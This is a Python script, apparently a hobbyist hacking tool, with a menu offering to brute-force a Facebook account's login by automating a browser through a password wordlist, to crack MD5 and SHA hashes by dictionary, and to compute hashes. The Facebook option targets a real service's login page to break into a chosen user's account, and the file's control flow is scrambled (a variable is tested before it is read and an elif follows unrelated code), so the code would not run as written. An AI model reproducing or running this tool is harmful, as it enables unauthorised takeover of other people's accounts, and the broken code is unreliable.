import hashlib
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
import sys

print("""
        1.Facebook bruteforce
        2.Bruteforce the hash
        3.Convert into hash
            0. EXIT
""")
if a == '1':
    try:
        file = open('settings.txt','w')
        path = input("Enter the path of the webdriver: ")
        file.write(path)
        driver = webdriver.Chrome(path)
        user = input("Enter the username of the user: ")
        psw = input("Enter the path for passwords file: ")
        driver.get("https://www.facebook.com")
        fil = open(psw,'r')
        for line in fil:
            email = driver.find_element_by_name("email")
            email.send_keys(user)
            password = driver.find_element_by_name("pass")
            password.send_keys(line)
            login = driver.find_element_by_name("login")
            login.send_keys(Keys.RETURN)
            # time.sleep(20)
    except :
        print("Sorry, File not found.")
a = input("Enter the mode: ")
elif a=="3":
    text = input("Enter the text you want to convert: ")
    hash_convert = input("Enter the hash(md5,sha1,sha224,sha256,sha384,sha512): ")
    if hash_convert == "md5":
        print(hashlib.md5(text.encode()).hexdigest())
    elif hash_convert == "sha1":
        print(hashlib.sha1(text.encode()).hexdigest())
    elif hash_convert == "sha224":
        print(hashlib.sha224(text.encode()).hexdigest())
    elif hash_convert == "sha256":
        print(hashlib.sha256(text.encode()).hexdigest())
    elif hash_convert == "sha384":
        print(hashlib.sha384(text.encode()).hexdigest())
    elif hash_convert == "sha512":
        print(hashlib.sha512(text.encode()).hexdigest())
elif a=="2":
    text = input("Enter the hash: ")
    file = input("Enter the path for the dictionary file: ")
    hash_convert = input("Enter the bruteforce hash(md5,sha1,sha224,sha256,sha384,sha512): ")
    if hash_convert == 'md5':
        with open(file,'r') as f:
            for line in f:
                a = str(hashlib.md5(line.encode()).hexdigest())
                if a == text:
                    print(f"Cracked, the password is {line}")
                else:
                    print(f"{line} not Matched")

    elif hash_convert == 'sha1':
        with open(file,'r') as f:
            for line in f:
                a = str(hashlib.sha1(line.encode()).hexdigest())
                if a == text:
                    print(f"Cracked, the password is {line}")
                else:
                    print(f"{line} not Matched")
    
    elif hash_convert == 'sha224':
        with open(file,'r') as f:
            for line in f:
                a = str(hashlib.sha224(line.encode()).hexdigest())
                if a == text:
                    print(f"Cracked, the password is {line}")
                else:
                    print(f"{line} not Matched")

    elif hash_convert == 'sha256':
        with open(file,'r') as f:
            for line in f:
                a = str(hashlib.sha256(line.encode()).hexdigest())
                if a == text:
                    print(f"Cracked, the password is {line}")
                else:
                    print(f"{line} not Matched")

    elif hash_convert == 'sha384':
        with open(file,'r') as f:
            for line in f:
                a = str(hashlib.sha384(line.encode()).hexdigest())
                if a == text:
                    print(f"Cracked, the password is {line}")
                else:
                    print(f"{line} not Matched")
    
    elif hash_convert == 'sha512':
        with open(file,'r') as f:
            for line in f:
                a = str(hashlib.sha512(line.encode()).hexdigest())
                if a == text:
                    print(f"Cracked, the password is {line}")
                else:
                    print(f"{line} not Matched")

    else:
        sys.exit()
elif a == "0":
    print("Coded by Sahil Singh.")
    print("Instagram: sahilsingh2_0_0")
    print("xd-coffin")
    sys.exit()